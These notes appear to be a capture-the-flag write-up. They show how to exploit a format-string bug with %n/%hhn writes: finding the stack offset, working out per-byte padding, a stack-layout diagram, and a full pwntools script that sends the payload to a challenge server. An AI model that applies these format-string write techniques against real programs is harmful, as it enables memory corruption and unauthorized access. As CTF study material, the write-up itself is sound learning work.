* use `%n` format string vuln to overwrite addr
* compare "12345678" locates at rbp-0x219 with "2tRi****" load from mem for first 4 characters, so try to overwrite rbp-0x219 to 2tRi
* offset: AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p, it turns out the 8th offset is usable
* payload = b"%46c...." + b"%16$hhn."  **.** is for the aligh, 2 with ascii decimal = 50 coz have 4 dots, so need %46c which means 46 spaces and 4 dots characters be written, and we wrote 50 to the address: payload += p64(target_address)
	* why 46c: align
	
	* why %16: 

	```
	payload = (b"%46c....")    # 8th offset
	payload += (b"%16$hhn.")
	
	payload += (b"%61c....")  # t = 116 - 50 =
	payload += (b"%17$hhn.")
	
	payload += (b"%218c...")  # R = 82 - 116 + 256 =222 - 4
	payload += (b"%18$hhn.")
	
	payload += (b"%18c....")  # i = 105 - 82
	payload += (b"%19$hhn.")
	
	payload += p64(target_address)		# 16th offset
	payload += p64(target_address + 1)	# 17th offset
	payload += p64(target_address + 2)	# 18th offset
	payload += p64(target_address + 3)	# 19th offset
	```
	
	* whole script
	
	Stack Layout (From higher to lower addresses):
	
	```
	┌───────────────────────────┐
	│ target_addr               │ 16th
	├───────────────────────────┤
	│ "%19$hhn."                │	15th
	├───────────────────────────┤
	│ "%18c...."                │	14th
	├───────────────────────────┤
	│ "%18$hhn."                │	13th
	├───────────────────────────┤
	│ "%218c..."                │ 12th
	├───────────────────────────┤
	│ "%17$hhn."                │ 11th
	├───────────────────────────┤
	│ "%61c...."                │ 10th
	├───────────────────────────┤
	│ "%16$hhn."                │ 9th
	├───────────────────────────┤
	│ "%46c...."                │ 8th 

	```
	
	```
	from pwn import *

	context.arch = 'amd64'
	# if args.REMOTE:
	p = remote('lol', 4003)
	# else:
	#     context.terminal = ['tmux', 'splitw', '-h']
	#     p = gdb.debug('./mimi',
	#                   gdbscript='''
	#                   b *0x401310
	#                   c
	#                   ''')
	
	p.recvuntil(b'A landslide has blocked the way at ').decode('utf-8').strip()
	rdn_addr_str = p.recvline().strip(b'\n')
	print('rdn_addr_str', rdn_addr_str)
	rdn_addr = int(rdn_addr_str, 16)
	
	target_address = rdn_addr
	
	payload = (b"%46c....")
	payload += (b"%16$hhn.")
	
	payload += (b"%61c....")  # t = 116 - 50 =
	payload += (b"%17$hhn.")
	
	payload += (b"%218c...")  # R = 82 - 116 + 256 =222 - 4
	payload += (b"%18$hhn.")
	
	payload += (b"%18c....")  # i = 105 - 82
	payload += (b"%19$hhn.")
	
	payload += p64(target_address)
	payload += p64(target_address + 1)
	payload += p64(target_address + 2)
	payload += p64(target_address + 3)
	
	
	p.recvuntil(b'Speak the phrase `2tRiViAl` and I shall open:').decode('utf-8').strip()
	p.sendline(payload)
	
	p.interactive()

	```
